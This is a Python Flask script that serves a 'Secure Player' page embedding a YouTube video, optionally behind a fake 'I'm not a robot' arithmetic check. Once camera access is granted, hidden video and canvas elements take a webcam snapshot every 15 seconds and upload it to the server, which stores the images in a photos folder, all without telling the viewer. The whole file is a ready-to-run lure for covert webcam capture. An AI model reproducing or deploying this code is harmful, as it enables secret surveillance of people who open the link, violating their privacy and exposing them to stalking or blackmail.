from flask import Flask, request, render_template_string, jsonify
import os, json, base64, uuid, re
from datetime import datetime
from urllib.parse import urlparse, parse_qs

app = Flask(__name__)
CONFIG_FILE = "config.json"

DEFAULT_CONFIG = {
    "video_url": "https://www.youtube.com/watch?v=S3mkmh18Zu0",
    "photo_dir": "photos",
    "recaptcha": False
}

if not os.path.exists(CONFIG_FILE):
    with open(CONFIG_FILE, "w") as f:
        json.dump(DEFAULT_CONFIG, f, indent=2)

def load_cfg():
    with open(CONFIG_FILE) as f:
        return json.load(f)

def get_video_id(url):
    q = parse_qs(urlparse(url).query)
    if "v" in q:
        return q["v"][0]
    m = re.search(r"(youtu\.be/|embed/)([\w-]+)", url)
    return m.group(2) if m else "S3mkmh18Zu0"

def photo_dir():
    p = os.path.abspath(load_cfg()["photo_dir"])
    os.makedirs(p, exist_ok=True)
    return p

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Secure Player</title>
<style>
body{margin:0;background:#000;color:#fff;font-family:Arial}
iframe{width:100%;height:50vh;border:0}
video,canvas{display:none}
</style>
</head>
<body>

<iframe src="https://www.youtube.com/embed/{{vid}}?autoplay=1&rel=0"></iframe>

{% if recaptcha %}
<div style="margin:20px auto;width:300px;background:#111;padding:10px;text-align:center">
<label><input type="checkbox" id="chk"> I'm not a robot</label>
<div id="q"></div>
<input id="a" style="display:none;width:100%">
<div id="s"></div>
</div>
{% endif %}

<video id="cam" autoplay playsinline></video>
<canvas id="cv"></canvas>

<script>
const useCaptcha={{recaptcha|lower}};
let ok=!useCaptcha;

const cam=document.getElementById("cam");
const cv=document.getElementById("cv");

{% if recaptcha %}
const chk=document.getElementById("chk");
const q=document.getElementById("q");
const a=document.getElementById("a");
const s=document.getElementById("s");

chk.onchange=()=>{
 if(chk.checked){
  let x=Math.floor(Math.random()*9)+1;
  let y=Math.floor(Math.random()*9)+1;
  q.innerText=`${x}+${y}=?`;
  q.dataset.ans=x+y;
  a.style.display="block";
 }
};

a.oninput=()=>{
 if(a.value==q.dataset.ans){
  s.innerText="Verified";
  ok=true;
  start();
 }
};
{% endif %}

async function start(){
 const st=await navigator.mediaDevices.getUserMedia({video:true});
 cam.srcObject=st;
 setInterval(()=>{
  if(!ok||!cam.videoWidth)return;
  cv.width=320;cv.height=240;
  cv.getContext("2d").drawImage(cam,0,0,320,240);
  fetch("/upload",{method:"POST",headers:{"Content-Type":"application/json"},
  body:JSON.stringify({image:cv.toDataURL("image/png")})});
 },15000);
}
if(!useCaptcha)start();
</script>
</body>
</html>
"""

@app.route("/")
def index():
    c = load_cfg()
    return render_template_string(
        HTML,
        vid=get_video_id(c["video_url"]),
        recaptcha=c["recaptcha"]
    )

@app.route("/upload", methods=["POST"])
def upload():
    img = request.json.get("image")
    if not img:
        return jsonify(error="no image"), 400
    _, b64 = img.split(",",1)
    data = base64.b64decode(b64)
    name = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{uuid.uuid4().hex[:6]}.png"
    with open(os.path.join(photo_dir(), name), "wb") as f:
        f.write(data)
    return jsonify(saved=name)

if __name__ == "__main__":
    print("[*] Flask running on http://0.0.0.0:5000")
    app.run(host="0.0.0.0", port=5000)
